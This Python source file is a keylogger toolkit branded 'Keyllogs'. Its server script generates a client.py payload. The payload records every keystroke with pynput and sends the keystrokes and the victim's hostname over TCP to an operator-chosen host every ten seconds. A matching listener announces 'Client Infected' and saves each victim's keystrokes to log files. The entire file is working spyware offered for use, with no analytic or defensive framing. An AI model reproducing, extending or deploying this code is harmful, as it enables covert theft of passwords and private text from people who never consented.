from os import *
import socket
import argparse
from colorama import *
from pyfade import Colors, Fade, Anime
from time import strftime
import io

class socks:
    def __init__(self):
        self.parser = argparse.ArgumentParser(description="Keyllogs [Bidouffe]")
        self.parser.add_argument('-A', help='Action [create/listen]')
        self.parser.add_argument('-H', help='IP to listen')
        self.parser.add_argument('-P', help='PORT to listen')
        self.args = self.parser.parse_args()
        self.Action = self.args.A
        self.Host = self.args.H
        self.Port = self.args.P

    def choice(self):
        if self.Action == None or self.Host == None or self.Port == None:
            server = socks()
            server.brand()
            self.parser.print_help()
            quit()

        if self.Action == "create":
            server = socks()
            server.brand()
            server.create()
            server.sock_create()
            server.sock_bind()
            server.listener()
        else:
            server = socks()
            server.brand()
            server.sock_create()
            server.sock_bind()
            server.listener()

    def create(self):
        file_content = r"""

import time
import os
import socket
import subprocess
from pynput.keyboard import Listener
from threading import Thread, Timer
import socket
import getpass

INTERVAL = 10

Host = '""" + self.Host + r"""'
Port = """ + self.Port + """


class socks:

    def conn():
        global s
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
        while True:
            try:
                s.connect((Host,Port))
                s.send(str.encode(socket.gethostname()))         
                
            except Exception as e:
                print("Error on socket connections: %s" %str(e))
                time.sleep(5)     
            else:
                break    

class Keylogger:
    def __init__(self, interval=60):
        self.interval = interval
        self.log = ""

    def _send_info(self, log):
        if log != "":
            s.send(self.log.encode("utf-8"))

    def _key_down(self, key):
        key = str(key).replace("'", "")
        key = " " if key == "Key.space" else key
        key = "\\n" if key == "Key.enter" else key

        if key == "Key.backspace":
            self.log = self.log[:len(self.log)-1]
            key = ""
            
        self.log += key

    def _report(self):
        self._send_info(self.log)
        self.log = ""
        Timer(self.interval, self._report).start()

    def run(self):
        self._report()
        with Listener(self._key_down) as c:
            c.join()



socks.conn()
Keylogger(INTERVAL).run()
"""
        with io.open("client.py", "w", encoding="utf-8") as fichier:
            fichier.write(file_content)
        print(f" [{Fore.GREEN}WARN{Fore.RESET}] Writing Keyllogs Client.")
        print(f" [{Fore.GREEN}WARN{Fore.RESET}] Keyllogs Client ready [Host => {self.Host} | Port => {self.Port}]")

    def brand(self):
        ziper_brand = f'''
  _  _  ____  _  _  __    __    _____  ___  ___ 
 ( )/ )( ___)( \/ )(  )  (  )  (  _  )/ __)/ __)
  )  (  )__)  \  /  )(__  )(__  )(_)(( (_-.\__ \   
 (_)\_)(____) (__) (____)(____)(_____)\___/(___/
        
        '''
        print(Fade.Vertical(Colors.white_to_blue, ziper_brand))

    def sock_create(self):
        global s
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    def sock_bind(self):
        s.bind((self.Host,int(self.Port)))
        print(f" Listenning session [{self.Host}:{self.Port}]")
        s.listen(1)

    def listener(self):
        try:
            client, ip = s.accept()
            username = client.recv(500)
            print(f" [{Fore.RED}WARN{Fore.RESET}] Client Infected", username.decode('utf-8'))
            print(f" [{Fore.GREEN}SAVE{Fore.RESET}] Save File => logs\\logs_{username.decode('utf-8')}.txt")
            while True:
                date_write = strftime('%X %x')
                date = strftime('%X')
                requete_client = client.recv(500)
                requete_client = requete_client.decode('utf-8')
                with io.open(f"logs\\logs_{username.decode('utf-8')}.txt", "a", encoding="utf-8")as f:
                    f.write((f"[{str(date_write)}] => {requete_client}\n"))
                print(f"""            
[{Fore.CYAN}LOGS{Fore.RESET}][{str(date)}][{Fore.CYAN}{username.decode('utf-8')}{Fore.RESET}]
――――――――――――――――――――――――――――――――――
{requete_client}""")
        except Exception:
            print(f" [{Fore.RED}WARN{Fore.RESET}] Connection lost with", username.decode('utf-8'))

server = socks()
server.choice()
